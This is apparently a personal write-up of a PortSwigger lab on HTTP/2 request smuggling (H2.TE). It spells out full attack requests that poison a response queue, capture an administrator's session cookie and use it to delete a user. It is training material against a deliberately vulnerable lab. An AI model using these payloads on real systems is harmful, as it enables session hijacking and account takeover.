# Response queue poisoning via H2.TE request smuggling

## Introduction

Welcome to my another writeup! In this Portswigger Labs [lab](https://portswigger.net/web-security/request-smuggling/advanced/response-queue-poisoning/lab-request-smuggling-h2-response-queue-poisoning-via-te-request-smuggling), you'll learn: Response queue poisoning via H2.TE request smuggling! Without further ado, let's dive in.

- Overall difficulty for me (From 1-10 stars): ★★★☆☆☆☆☆☆☆

## Background

This lab is vulnerable to request smuggling because the front-end server downgrades HTTP/2 requests even if they have an ambiguous length.

To solve the lab, delete the user `carlos` by using response queue poisoning to break into the admin panel at `/admin`. An admin user will log in approximately every 15 seconds.

The connection to the back-end is reset every 10 requests, so don't worry if you get it into a bad state - just send a few normal requests to get a fresh connection.

> Note: This lab supports HTTP/2 but doesn't advertise this via ALPN. To send HTTP/2 requests using Burp Repeater, you need to enable the [Allow HTTP/2 ALPN override](https://portswigger.net/burp/documentation/desktop/http2#allow-http-2-alpn-override) option and manually [change the protocol to HTTP/2 using the Inspector](https://portswigger.net/burp/documentation/desktop/http2#changing-the-protocol-for-a-request).
>  
> Please note that this feature is only available from [Burp Suite Professional / Community 2021.9.1](https://portswigger.net/burp/releases).

## Exploitation

**Home page:**

![](https://github.com/siunam321/CTF-Writeups/blob/main/Portswigger-Labs/HTTP-Request-Smuggling/Smuggling-11/images/Pasted%20image%2020230210170333.png)

Burp Suite HTTP history:

![](https://github.com/siunam321/CTF-Writeups/blob/main/Portswigger-Labs/HTTP-Request-Smuggling/Smuggling-11/images/Pasted%20image%2020230210171026.png)

Let's send that request to Burp Suite's Repeater, and test HTTP request smuggling:

![](https://github.com/siunam321/CTF-Writeups/blob/main/Portswigger-Labs/HTTP-Request-Smuggling/Smuggling-11/images/Pasted%20image%2020230210171103.png)

Then change the request method to POST:

![](https://github.com/siunam321/CTF-Writeups/blob/main/Portswigger-Labs/HTTP-Request-Smuggling/Smuggling-11/images/Pasted%20image%2020230210171138.png)

First, we'll test CL.TE (Front-end uses `Content-Length` header, back-end uses `Transfer-Encoding` header) HTTP request smuggling.

- Send an attack request:

```http
POST / HTTP/1.1
Host: 0a38005e0453f16bc058355500550074.web-security-academy.net
Content-Type: application/x-www-form-urlencoded
Content-Length: 35
Transfer-Encoding : chunked

0

GET /404pls HTTP/1.1
X-Foo: x
```

![](https://github.com/siunam321/CTF-Writeups/blob/main/Portswigger-Labs/HTTP-Request-Smuggling/Smuggling-11/images/Pasted%20image%2020230210171417.png)

- Send a normal request:

![](https://github.com/siunam321/CTF-Writeups/blob/main/Portswigger-Labs/HTTP-Request-Smuggling/Smuggling-11/images/Pasted%20image%2020230210171452.png)

Nope. It doesn't work.

Next, we'll test TE.CL (Front-end uses `Transfer-Encoding` header, back-end uses `Content-Length` header) HTTP request smuggling.

- Send an attack request:

```http
POST / HTTP/1.1
Host: 0a38005e0453f16bc058355500550074.web-security-academy.net
Content-Type: application/x-www-form-urlencoded
Content-Length: 4
Transfer-Encoding : chunked

aa

GET /404pls HTTP/1.1
Host: 0acf00f60450a586c32e10f900470091.web-security-academy.net
Content-Type: application/x-www-form-urlencoded
Content-Length: 20

smuggled=yes
0


```

![](https://github.com/siunam321/CTF-Writeups/blob/main/Portswigger-Labs/HTTP-Request-Smuggling/Smuggling-11/images/Pasted%20image%2020230210171937.png)

- Send a normal request:

![](https://github.com/siunam321/CTF-Writeups/blob/main/Portswigger-Labs/HTTP-Request-Smuggling/Smuggling-11/images/Pasted%20image%2020230210171946.png)

Still nope...

Now, what if I upgrade the HTTP to version 2 (HTTP/2)?

To do so, we'll need to:

- Enable the [Allow HTTP/2 ALPN override](https://portswigger.net/burp/documentation/desktop/http2#allow-http-2-alpn-override) and disable option "Update Content-Length" in Burp Suite's Repeater:

![](https://github.com/siunam321/CTF-Writeups/blob/main/Portswigger-Labs/HTTP-Request-Smuggling/Smuggling-11/images/Pasted%20image%2020230210173050.png)

- Manually [change the protocol to HTTP/2 using the Inspector](https://portswigger.net/burp/documentation/desktop/http2#changing-the-protocol-for-a-request):

![](https://github.com/siunam321/CTF-Writeups/blob/main/Portswigger-Labs/HTTP-Request-Smuggling/Smuggling-11/images/Pasted%20image%2020230210172815.png)

**Then, we can send an attack request:**
```http
POST / HTTP/2
Host: 0a38005e0453f16bc058355500550074.web-security-academy.net
Content-Type: application/x-www-form-urlencoded
Transfer-Encoding: chunked

0

smuggled
```

![](https://github.com/siunam321/CTF-Writeups/blob/main/Portswigger-Labs/HTTP-Request-Smuggling/Smuggling-11/images/Pasted%20image%2020230210173126.png)

**After that, when we send the second request, it returns a 404 response:**

![](https://github.com/siunam321/CTF-Writeups/blob/main/Portswigger-Labs/HTTP-Request-Smuggling/Smuggling-11/images/Pasted%20image%2020230210173210.png)

Now, we can confirm that **the web application is vulnerable to H2.TE (Front-end uses HTTP/2, back-end uses `Transfer-Encoding` header) HTTP request smuggling.**

**In here, we can try to smuggle a complete request.**

If we instead smuggle a request that also contains a body, the next request on the connection will be appended to the body of the smuggled request. This often has the side-effect of truncating the final request based on the apparent `Content-Length`. As a result, the back-end effectively sees three requests, where the third "request" is just a series of leftover bytes.

- Send an attack request:

```http
POST /404pls HTTP/2
Host: 0a38005e0453f16bc058355500550074.web-security-academy.net
Content-Type: application/x-www-form-urlencoded
Transfer-Encoding: chunked

0

GET /404pls HTTP/1.1
Host: 0a38005e0453f16bc058355500550074.web-security-academy.net


```

In here, we're going to a non-existent endpoint, so that we can verify the smuggling worked. Also, in the smuggled body, we downgraded the HTTP version to HTTP/1.1.

**When we send that request, we should receive a 404 response:**

![](https://github.com/siunam321/CTF-Writeups/blob/main/Portswigger-Labs/HTTP-Request-Smuggling/Smuggling-11/images/Pasted%20image%2020230210174412.png)

**Now, we can poison the response queue by sending that request, and capture victim's session cookie:**

![](https://github.com/siunam321/CTF-Writeups/blob/main/Portswigger-Labs/HTTP-Request-Smuggling/Smuggling-11/images/Pasted%20image%2020230210174540.png)

Normally, we would receive a 404 response. This time, however, we received a 302 response. That being said, we successfully captured a victim's response!

**Since we captured a session cookie, we can try to access to the admin panel:**

![](https://github.com/siunam321/CTF-Writeups/blob/main/Portswigger-Labs/HTTP-Request-Smuggling/Smuggling-11/images/Pasted%20image%2020230213202504.png)

Boom! We can access to the admin panel!

**Let's delete user `carlos`!**

![](https://github.com/siunam321/CTF-Writeups/blob/main/Portswigger-Labs/HTTP-Request-Smuggling/Smuggling-11/images/Pasted%20image%2020230213202550.png)

Nice!

# What we've learned:

1. Response queue poisoning via H2.TE request smuggling